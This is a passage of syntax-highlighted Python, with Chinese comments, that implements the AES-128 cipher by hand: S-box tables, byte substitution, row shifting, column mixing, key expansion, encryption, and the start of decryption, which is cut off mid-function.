    <span class="hljs-number">0xba</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xdd</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x8a</span>,<br>        <span class="hljs-number">0x70</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0xf6</span>,<span class="hljs-number">0x0e</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0x9e</span>,<br>        <span class="hljs-number">0xe1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0xdf</span>,<br>        <span class="hljs-number">0x8c</span>,<span class="hljs-number">0xa1</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0xbf</span>,<span class="hljs-number">0xe6</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x16</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">StreamListToMix</span>(<span class="hljs-params">SL</span>):<br>mix=np.zeros((<span class="hljs-number">4</span>,<span class="hljs-number">4</span>),dtype=<span class="hljs-built_in">int</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>tmp=SL[i]<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>mix[j][i]=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">8</span>*j:<span class="hljs-number">8</span>*j+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">return</span> mix<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">StreamListToMix(SL) 的返回值形如</span><br><span class="hljs-string">[[251 133 249  67]</span><br><span class="hljs-string"> [ 69 182 143 143]</span><br><span class="hljs-string"> [168 239 182  99]</span><br><span class="hljs-string"> [159 159 182  99]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SubByte</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#字节替换</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>tmp=<span class="hljs-built_in">bin</span>(mix[i][j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)  <span class="hljs-comment">#tmp=01100011(格式)</span><br>x=<span class="hljs-built_in">int</span>(tmp[:<span class="hljs-number">4</span>],<span class="hljs-number">2</span>)  <span class="hljs-comment">#行数 6</span><br>y=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">4</span>:],<span class="hljs-number">2</span>)  <span class="hljs-comment">#列数 3</span><br>mix[i][j]=Subchart[<span class="hljs-number">16</span>*x+y] <span class="hljs-comment">#查表替换 0xfb,但会自动保存为10进制 251</span><br><br><span class="hljs-keyword">return</span> mix<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">SubByte(mix)的返回值形如</span><br><span class="hljs-string">[[251 133 249  67]</span><br><span class="hljs-string"> [ 69 182 143 143]</span><br><span class="hljs-string"> [168 239 182  99]</span><br><span class="hljs-string"> [159 159 182  99]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RotHang</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#行位移</span><br>res_mix=np.zeros((<span class="hljs-number">4</span>,<span class="hljs-number">4</span>),dtype=<span class="hljs-built_in">int</span>)<br>res_mix[<span class="hljs-number">0</span>]=mix[<span class="hljs-number">0</span>]<br>res_mix[<span class="hljs-number">1</span>]=np.roll(mix[<span class="hljs-number">1</span>],-<span class="hljs-number">1</span>)<br>res_mix[<span class="hljs-number">2</span>]=np.roll(mix[<span class="hljs-number">2</span>],-<span class="hljs-number">2</span>)<br>res_mix[<span class="hljs-number">3</span>]=np.roll(mix[<span class="hljs-number">3</span>],-<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">return</span> res_mix<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">RotHang(mix)的返回值形如</span><br><span class="hljs-string">[[251 133 249  67]</span><br><span class="hljs-string"> [182 143 143  69]</span><br><span class="hljs-string"> [182  99 168 239]</span><br><span class="hljs-string"> [ 99 159 159 182]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">a,b</span>):<br><span class="hljs-keyword">if</span> a==<span class="hljs-number">0x01</span>:<br><span class="hljs-keyword">return</span> b         <span class="hljs-comment">#乘上上1，值不变</span><br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x02</span>:<br><span class="hljs-keyword">if</span> b&amp;<span class="hljs-number">128</span>!=<span class="hljs-number">128</span>:<br><span class="hljs-keyword">return</span> b&lt;&lt;<span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>tmp=(b&lt;&lt;<span class="hljs-number">1</span>)-<span class="hljs-number">256</span><br><span class="hljs-keyword">return</span> tmp^<span class="hljs-number">0x1b</span>    <span class="hljs-comment">#与上10000000，判断最高位是否为1，不为1直接左移一位</span><br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x03</span>:<br><span class="hljs-keyword">return</span> mul(<span class="hljs-number">0x02</span>,b)^b<br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x09</span>:<br><span class="hljs-keyword">return</span> mul(<span class="hljs-number">0x02</span>,mul(<span class="hljs-number">0x02</span>,mul(<span class="hljs-number">0x02</span>,b)))^b<br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x0b</span>:<br><span class="hljs-keyword">return</span> mul(<span class="hljs-number">0x09</span>,b)^mul(<span class="hljs-number">0x02</span>,b)<br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x0d</span>:<br><span class="hljs-keyword">return</span> mul(<span class="hljs-number">0x02</span>,mul(<span class="hljs-number">0x02</span>,mul(<span class="hljs-number">0x02</span>,b)))^mul(<span class="hljs-number">0x02</span>,mul(<span class="hljs-number">0x02</span>,b))^b<br><span class="hljs-keyword">elif</span> a==<span class="hljs-number">0x0e</span>:<br><span class="hljs-keyword">return</span> mul(<span class="hljs-number">0x0d</span>,b)^mul(<span class="hljs-number">0x03</span>,b)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ColMix</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#列混淆</span><br>CM_B=[[<span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>],<br>[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>],<br>[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>],<br>[<span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>]]<br><br>z_array=np.zeros((<span class="hljs-number">4</span>,<span class="hljs-number">4</span>),dtype=<span class="hljs-built_in">int</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>z_array[j][q]^=mul(CM_B[j][k],mix[k][q])<br><br><span class="hljs-comment">#print(z_array)</span><br><span class="hljs-keyword">return</span> z_array<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">ColMix(mix)的返回值形如</span><br><span class="hljs-string">[[ 21 160  99  12]</span><br><span class="hljs-string"> [ 13  71 139 128]</span><br><span class="hljs-string"> [ 79  76 192 175]</span><br><span class="hljs-string"> [222 232  94 239]]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RoundKeyAdd</span>(<span class="hljs-params">mix_m,mix_k</span>):<br>res_mix=mix_m^mix_k<br><span class="hljs-keyword">return</span> res_mix<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">T_SubByte</span>(<span class="hljs-params">s</span>):<br><span class="hljs-comment">#字节替换</span><br><br>a=[] <span class="hljs-comment">#放置代换后的四个字节对应的16进制</span><br><span class="hljs-comment">#b=[] #放置代换后的四个字节对应的2进制</span><br><span class="hljs-comment">#print(&#x27;s:%s&#x27;%s)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>tmp=s[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>]<br><span class="hljs-comment">#print(tmp)</span><br>x=<span class="hljs-built_in">int</span>(tmp[:<span class="hljs-number">4</span>],<span class="hljs-number">2</span>)  <br><span class="hljs-comment">#print(&#x27;0b&#x27;+tmp[4:])</span><br>y=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">4</span>:],<span class="hljs-number">2</span>)  <span class="hljs-comment">#2进制转10进制得到行列数 1100001011111011011111100</span><br><span class="hljs-comment">#print(y)</span><br><span class="hljs-comment">#b.append(bin(int(Subchart[x*16+y]))[2:].zfill(8))  #2进制(不加0b)</span><br>a.append(Subchart[x*<span class="hljs-number">16</span>+y])          <span class="hljs-comment">#16进制(加0x) X  其实储存为10进制了</span><br><br><span class="hljs-comment">#print(a)</span><br><br><span class="hljs-keyword">return</span> a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RotByte</span>(<span class="hljs-params">word</span>):<br><span class="hljs-comment">#字循环： 循环左移一个字节</span><br><span class="hljs-keyword">return</span> word[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>]+word[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>]+word[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>]+word[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">T</span>(<span class="hljs-params">w,j</span>): <span class="hljs-comment">#w为上一组128bit密钥的最后一个字，j为轮次</span><br><span class="hljs-comment">#T函数</span><br>Rcon=[<span class="hljs-number">0x01</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x10</span>,   <span class="hljs-comment">#轮常量</span><br>  <span class="hljs-number">0x20</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x36</span>]<br><br><span class="hljs-comment">#第一步：字循环</span><br>tmp=RotByte(w)<br><span class="hljs-comment">#print(tmp)</span><br><br><span class="hljs-comment">#第二步字节代换</span><br>tmp_2=T_SubByte(tmp)<br><span class="hljs-comment">#print(tmp_2)</span><br><span class="hljs-comment">#第三步轮密钥异或</span><br>tmp_3=tmp_2[<span class="hljs-number">0</span>]^Rcon[j]<br>tmp_2[<span class="hljs-number">0</span>]=tmp_3   <span class="hljs-comment">#tmp_2 形如 [17, 68, 41, 219]</span><br><br>Result=<span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-comment">#将tmp_2转成2进制串</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>b_2=<span class="hljs-built_in">bin</span>(tmp_2[i])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>Result=Result+b_2        <br><br><span class="hljs-keyword">return</span> Result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">WordExp</span>(<span class="hljs-params">key</span>):<br><span class="hljs-comment">#密钥拓展</span><br>Words=[]<br>Words.append(key)<br><br><span class="hljs-comment">#print(Words)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>word=[]<br>tmp=T(Words[i][<span class="hljs-number">3</span>],i)<br><span class="hljs-comment">#print(tmp)</span><br>tmp=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0b&#x27;</span>+Words[i][<span class="hljs-number">0</span>])^<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0b&#x27;</span>+tmp)<br>word.append(tmp)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>word.append(word[j]^<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0b&#x27;</span>+Words[i][j+<span class="hljs-number">1</span>]))<br><span class="hljs-comment">#print(word)</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>word[s]=<span class="hljs-built_in">bin</span>(word[s])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br><br>Words.append(word)<br><br><span class="hljs-keyword">return</span> Words<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message,key</span>):<br>mix=message<br><span class="hljs-comment">#mix=StreamListToMix(message)</span><br>Words=WordExp(key)<br><br><span class="hljs-comment">#轮密钥加</span><br>w_mix_1=StreamListToMix(Words[<span class="hljs-number">0</span>])<br>Result_1=RoundKeyAdd(mix,w_mix_1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br><span class="hljs-comment">#字节代换</span><br><span class="hljs-comment">#print(Result_1)</span><br>Result_2=SubByte(Result_1)<br><span class="hljs-comment">#行位移</span><br>Result_2=RotHang(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><span class="hljs-comment">#列混淆</span><br>Result_2=ColMix(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><span class="hljs-comment">#轮密钥加</span><br>w_mix_i=StreamListToMix(Words[i+<span class="hljs-number">1</span>])<br>Result_1=RoundKeyAdd(Result_2,w_mix_i)<br><span class="hljs-comment">#print(Result_1)</span><br><span class="hljs-comment">#第10轮</span><br>w_mix_11=StreamListToMix(Words[<span class="hljs-number">10</span>])<br><span class="hljs-comment">#字节代换</span><br>Result_2=SubByte(Result_1)<br><span class="hljs-comment">#行位移</span><br>Result_2=RotHang(Result_2)<br><span class="hljs-comment">#print(Result_2)</span><br><span class="hljs-comment">#轮密钥加</span><br>Result_1=RoundKeyAdd(Result_2,w_mix_11)<br><br><br><span class="hljs-keyword">return</span> Result_1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ReSubByte</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#逆字节替换</span><br>ReSubchart = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>,<span class="hljs-number">0xfb</span>,<br><span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>,<span class="hljs-number">0xcb</span>,<br><span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x4e</span>,<br><span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>,<span class="hljs-number">0x25</span>,<br><span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>,<span class="hljs-number">0x92</span>,<br><span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>,<span class="hljs-number">0x84</span>,<br><span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>,<span class="hljs-number">0x06</span>,<br><span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>,<span class="hljs-number">0x6b</span>,<br><span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>,<span class="hljs-number">0x73</span>,<br><span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>,<span class="hljs-number">0x6e</span>,<br><span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>,<span class="hljs-number">0x1b</span>,<br><span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>,<span class="hljs-number">0xf4</span>,<br><span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>,<span class="hljs-number">0x5f</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>,<span class="hljs-number">0xef</span>,<br><span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>,<span class="hljs-number">0x61</span>,<br><span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>,<span class="hljs-number">0x7d</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>tmp=<span class="hljs-built_in">bin</span>(mix[i][j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)  <span class="hljs-comment">#tmp=01100011(格式)</span><br>x=<span class="hljs-built_in">int</span>(tmp[:<span class="hljs-number">4</span>],<span class="hljs-number">2</span>)  <span class="hljs-comment">#行数 6</span><br>y=<span class="hljs-built_in">int</span>(tmp[<span class="hljs-number">4</span>:],<span class="hljs-number">2</span>)  <span class="hljs-comment">#列数 3</span><br>mix[i][j]=ReSubchart[<span class="hljs-number">16</span>*x+y] <span class="hljs-comment">#查表替换 0xfb,但会自动保存为10进制 251</span><br><br><br><span class="hljs-keyword">return</span> mix<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ReRotHang</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#逆行位移</span><br>res_mix=np.zeros((<span class="hljs-number">4</span>,<span class="hljs-number">4</span>),dtype=<span class="hljs-built_in">int</span>)<br>res_mix[<span class="hljs-number">0</span>]=mix[<span class="hljs-number">0</span>]<br>res_mix[<span class="hljs-number">1</span>]=np.roll(mix[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)<br>res_mix[<span class="hljs-number">2</span>]=np.roll(mix[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)<br>res_mix[<span class="hljs-number">3</span>]=np.roll(mix[<span class="hljs-number">3</span>],<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">return</span> res_mix<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ReColMix</span>(<span class="hljs-params">mix</span>):<br><span class="hljs-comment">#列混淆</span><br>CM_B=[[<span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>],<br>[<span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>],<br>[<span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>],<br>[<span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>]]<br><br>z_array=np.zeros((<span class="hljs-number">4</span>,<span class="hljs-number">4</span>),dtype=<span class="hljs-built_in">int</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>z_array[j][q]^=mul(CM_B[j][k],mix[k][q])<br><br><span class="hljs-string">&#x27;&#x27;&#x27;mix_2=&#x27;&#x27;</span><br><span class="hljs-string">for i in range(4):</span><br><span class="hljs-string">for j in range(4):</span><br><span class="hljs-string">mix_2=mix_2+str(hex(z_array[j][i]))</span><br><span class="hljs-string">print(mix_2)&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">return</span> z_array<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">message,key</span>):<br><span class="hljs-comment">#mix=StreamListToMix(message)</span><br>mix=message<br>Words=WordExp(key)<br>Words.reverse()<br><span class="hljs-comment">#print(Words)</span><br><span class="hljs-comment">#轮密钥加</span><br>w_mix_1=StreamListToMix(Words[<span class="hljs-number">0</span>])<br>Result_1=RoundKeyAdd(mix,w_mix_1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br><span class="hljs-comment">#字节代换</span><br><span class="hljs-comment">#print(Result_1)</span><br>Result_2=ReSubByte(Result_1)<br><span 